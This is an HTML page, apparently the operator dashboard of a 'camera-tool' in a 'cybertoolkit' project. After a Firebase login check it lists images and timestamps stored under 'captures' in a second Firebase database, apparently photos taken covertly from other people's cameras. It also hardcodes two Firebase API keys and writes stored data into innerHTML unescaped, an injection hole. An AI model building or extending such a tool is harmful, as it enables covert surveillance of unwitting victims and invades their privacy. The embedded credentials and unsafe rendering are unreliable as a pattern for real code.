<!DOCTYPE html>
<html>
<head>
    <title>Gallery - WE ARE KING</title>
    <style>
        body { display: none; background: #0f172a; color: white; font-family: sans-serif; padding: 20px; text-align: center; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 30px; }
        .card { background: #1e293b; padding: 10px; border-radius: 10px; border: 1px solid #00d2ff; }
        img { width: 100%; border-radius: 5px; }
        .time { font-size: 11px; color: #94a3b8; margin-top: 5px; }
    </style>
</head>
<body>
    <h1 style="color: #00d2ff;">CAPTURED GALLERY</h1>
    <a href="camera-tool.html" style="color: white; text-decoration: none;">[ Back to Dashboard ]</a>
    <div class="grid" id="gallery"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        // 1. MAIN WEBSITE CONFIG (Login Check)
        const mainSiteConfig = { 
            apiKey: "AIzaSyC9z_N93wf9RFzEYZEIlXE8yiCcnJuWC4A", 
            authDomain: "cybertoolkit-65b65.firebaseapp.com",
            projectId: "cybertoolkit-65b65"
        };

        // 2. CAMERA TOOL CONFIG (Data Reading)
        const cameraToolConfig = {
            apiKey: "AIzaSyDyl_AUPvulQJtVPBEeofS0OaWADyO4acw",
            databaseURL: "https://camera-fc58f-default-rtdb.firebaseio.com",
            projectId: "camera-fc58f",
        };

        const mainApp = initializeApp(mainSiteConfig, "mainApp");
        const cameraApp = initializeApp(cameraToolConfig, "cameraApp");
        
        const auth = getAuth(mainApp);
        const db = getDatabase(cameraApp);

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.body.style.display = "block";
                // Fetch photos from Camera Project
                onValue(ref(db, 'captures'), (snapshot) => {
                    const data = snapshot.val();
                    const gallery = document.getElementById('gallery');
                    gallery.innerHTML = '';
                    if(!data) { gallery.innerHTML = "No photos captured yet."; return; }
                    
                    for (let id in data) {
                        const div = document.createElement('div');
                        div.className = 'card';
                        div.innerHTML = `
                            <img src="${data[id].image}">
                            <div class="time">${new Date(data[id].time).toLocaleString()}</div>
                        `;
                        gallery.prepend(div);
                    }
                });
            } else {
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
